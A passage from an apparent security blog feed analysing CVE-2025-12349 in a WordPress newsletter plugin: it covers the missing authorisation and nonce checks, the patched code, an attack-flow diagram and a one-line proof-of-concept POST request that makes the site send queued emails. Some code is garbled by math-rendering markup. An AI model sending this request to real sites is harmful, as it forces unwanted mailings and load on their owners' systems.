xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;/msub&gt;&lt;msub&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mo separator=&#34;true&#34;&gt;;&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;can_access_campaign = ES_Common::ig_es_can_access( &amp;#x27;campaigns&amp;#x27; );&#xA;&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.854em;vertical-align:-0.1944em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.1514em;&#34;&gt;&lt;span style=&#34;top:-2.55em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;a&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;cces&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.1514em;&#34;&gt;&lt;span style=&#34;top:-2.55em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;c&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;am&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;ai&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.3283em;&#34;&gt;&lt;span style=&#34;top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;mm&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.0019em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.1514em;&#34;&gt;&lt;span style=&#34;top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;e&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.1514em;&#34;&gt;&lt;span style=&#34;top:-2.55em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;c&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.1514em;&#34;&gt;&lt;span style=&#34;top:-2.55em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;a&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;ccess&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.7519em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;am&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;ai&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.7519em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;nonce = ig_es_get_request_data( &amp;rsquo;nonce&amp;rsquo; );&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function trigger_mailing_queue_sending() {&#xA;    $can_access_campaign = ES_Common::ig_es_can_access( &amp;#39;campaigns&amp;#39; );&#xA;    $nonce = ig_es_get_request_data( &amp;#39;nonce&amp;#39; );&#xA;    &#xA;    if ( ! $can_access_campaign ) {&#x9;&#xA;        return;&#xA;    } &#xA;&#xA;    if ( empty( $nonce ) || ! wp_verify_nonce( $nonce, &amp;#39;ig-es-trigger-mailing-queue-sending-nonce&amp;#39; ) ) {&#xA;        return;&#xA;    }&#xA;        &#xA;    // Call cron action only when it is not locked.&#xA;    if ( ! ES()-&amp;gt;cron-&amp;gt;is_locked() ) {&#x9;&#x9;&#xA;        // Start processing of campaigns which are scheduled for current date time.&#xA;        do_action( &amp;#39;ig_es_cron_worker&amp;#39; );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Capability check&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$can_access_campaign = ES_Common::ig_es_can_access( &amp;#39;campaigns&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Only users with permission to access &lt;strong&gt;campaigns&lt;/strong&gt; are allowed to proceed. If the user lacks permission → &lt;strong&gt;return&lt;/strong&gt; immediately.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;  public static function ig_es_can_access( $page ) {&#xA;      $user = wp_get_current_user();&#xA;&#xA;      if ( ! $user-&amp;gt;exists() ) {&#xA;          return false;&#xA;      }&#xA;&#xA;      $default_permission = &amp;#39;manage_options&amp;#39;;&#xA;&#xA;      $can_access = $user-&amp;gt;has_cap( $default_permission );&#xA;&#xA;      // Is Admin? Have full access.&#xA;      if ( $can_access ) {&#xA;          return true;&#xA;      }&#xA;&#xA;      // We are using this filter in ES Premium to check permission.&#xA;      return apply_filters( &amp;#39;ig_es_can_access&amp;#39;, $can_access, $page );&#xA;  }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;strong&gt;&lt;code&gt;ig_es_can_access()&lt;/code&gt;&lt;/strong&gt; function checks the access rights of the current user. If the user &lt;strong&gt;is not logged in&lt;/strong&gt;, access is immediately denied. By default, only users with the &lt;strong&gt;&lt;code&gt;manage_options&lt;/code&gt;&lt;/strong&gt; capability (Administrator) are allowed access. If the user does not have this capability, the result depends on the &lt;strong&gt;&lt;code&gt;ig_es_can_access&lt;/code&gt; filter&lt;/strong&gt;, allowing extension or customization of permissions.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Nonce verification (CSRF protection)&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$nonce = ig_es_get_request_data( &amp;#39;nonce&amp;#39; );&#xA;wp_verify_nonce( $nonce, &amp;#39;ig-es-trigger-mailing-queue-sending-nonce&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ensures the request is legitimate and generated from a valid WordPress interface, preventing direct external calls.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Preserving existing logic but placing it after security checks&lt;/strong&gt;&#xA;Only after &lt;strong&gt;passing capability and nonce checks&lt;/strong&gt; does the function check the &lt;strong&gt;cron lock&lt;/strong&gt; and invoke:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;do_action( &amp;#39;ig_es_cron_worker&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;👉 Result: the AJAX endpoint &lt;strong&gt;can no longer be abused by unauthenticated users&lt;/strong&gt;, preventing &lt;strong&gt;forced email sending&lt;/strong&gt;, &lt;strong&gt;schedule bypass&lt;/strong&gt;, and &lt;strong&gt;DoS-like behavior&lt;/strong&gt; as before.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Unauthenticated attacker&amp;#34;] --&amp;gt; B[&amp;#34;Send request to /wp-admin/admin-ajax.php?action=ig_es_trigger_mailing_queue_sending&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;wp_ajax_nopriv_ig_es_trigger_mailing_queue_sending hook&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;trigger_mailing_queue_sending() is executed&amp;#34;]&#xA;D --&amp;gt; E{&amp;#34;Capability check?&amp;#34;}&#xA;E -- No --&amp;gt; F[&amp;#34;No permission validation&amp;#34;]&#xA;F --&amp;gt; G{&amp;#34;Nonce verification?&amp;#34;}&#xA;G -- No --&amp;gt; H[&amp;#34;No CSRF protection&amp;#34;]&#xA;H --&amp;gt; I{&amp;#34;Cron locked?&amp;#34;}&#xA;I -- No --&amp;gt; J[&amp;#34;do_action(&amp;#39;ig_es_cron_worker&amp;#39;)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;process_campaigns()&amp;#34;]&#xA;J --&amp;gt; L[&amp;#34;process_queue()&amp;#34;]&#xA;K --&amp;gt; M[&amp;#34;Force email campaigns to send immediately&amp;#34;]&#xA;L --&amp;gt; N[&amp;#34;Force queued emails to be sent&amp;#34;]&#xA;M --&amp;gt; O[&amp;#34;Bypass schedule &amp;amp; update campaign states&amp;#34;]&#xA;N --&amp;gt; O&#xA;O --&amp;gt; P[&amp;#34;Broken Access Control / Abuse / DoS-like behavior&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Send request as an unauthenticated user:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;&#xA;action=ig_es_trigger_mailing_queue_sending&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-12349 originates from the Icegram Express plugin registering an AJAX endpoint with &lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; without performing any capability checks or nonce verification in the &lt;code&gt;trigger_mailing_queue_sending&lt;/code&gt; function. This allows unauthenticated users to directly trigger the plugin’s internal cron, leading to forced email sending, schedule bypass, campaign state updates, and unnecessary system load. The patch in version 5.9.11 fully resolves the issue by adding capability checks and nonce verification before allowing cron logic execution.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Never attach sensitive logic to &lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; without proper permission checks.&lt;/li&gt;&#xA;&lt;li&gt;WordPress AJAX endpoints must always combine &lt;strong&gt;capability checks&lt;/strong&gt; and &lt;strong&gt;nonce verification&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Cron or background processes with system impact should be protected like administrative actions.&lt;/li&gt;&#xA;&lt;li&gt;Broken Access Control can lead to functional abuse even without direct data leakage.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/email-subscribers/vulnerability/wordpress-email-subscribers-newsletters-plugin-5-9-10-missing-authentication-to-unauthenticated-mailing-queue-trigger-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Email Subscribers &amp;amp; Newsletters Plugin &amp;lt;= 5.9.10 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-12174 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-13-cve-2025-12174/</link>
